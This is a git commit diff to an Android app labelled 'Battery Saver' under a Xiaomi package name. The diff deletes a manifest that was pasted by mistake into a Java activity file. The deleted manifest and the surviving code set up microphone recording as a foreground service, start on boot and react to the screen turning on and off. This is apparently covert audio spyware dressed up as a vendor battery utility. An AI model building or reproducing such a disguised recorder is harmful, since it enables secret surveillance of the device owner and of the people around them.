ac7d8df5512cb44d8ee0354c3f85afe1b0968181
jamalsbanana <joshkross3@gmail.com>
2024-03-23 00:31:53 +0700

    blablabla

--- app/src/main/java/com/xiaomi/batterysaver/service/PermissionActivity.java
+++ app/src/main/java/com/xiaomi/batterysaver/service/PermissionActivity.java
@@ -64,66 +64,7 @@ public class PermissionActivity extends Activity {
                 Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
                 startActivity(intent);
             }
-        }<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
-
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
-    <uses-permission android:name="android.permission.WAKE_LOCK"/>
-    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
-    <!-- Removed WRITE_EXTERNAL_STORAGE permission as it's deprecated for apps targeting Android 13+ -->
-
-                <application
-        android:icon="@drawable/icons8_xiaomi_240"
-        android:label="Battery Saver"
-        android:roundIcon="@drawable/icons8_xiaomi_240"
-        android:supportsRtl="true"
-        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
-
-        <activity
-        android:name="com.xiaomi.batterysaver.service.PermissionActivity"
-        android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN"/>
-                <category android:name="android.intent.category.LAUNCHER"/>
-            </intent-filter>
-        </activity>
-
-        <service
-        android:name="com.xiaomi.batterysaver.service.TimeCheckService"
-        android:enabled="true"
-        android:exported="false" />
-
-        <service
-        android:name="com.xiaomi.batterysaver.service.RecordService"
-        android:enabled="true"
-        android:exported="false"
-        android:foregroundServiceType="microphone">
-            <!-- Ensure you have the necessary permissions if your app's functionality requires any from the specific list provided earlier -->
-                </service>
-
-        <receiver
-        android:name="com.xiaomi.batterysaver.service.BootReceiver"
-        android:enabled="true"
-        android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED"/>
-            </intent-filter>
-        </receiver>
-
-        <receiver
-        android:name="com.xiaomi.batterysaver.service.ScreenStateReceiver"
-        android:enabled="true"
-        android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.SCREEN_OFF"/>
-                <action android:name="android.intent.action.SCREEN_ON"/>
-            </intent-filter>
-        </receiver>
-    </application>
-
-</manifest>
+        }
         proceedToStartRecordingService();
     }
 
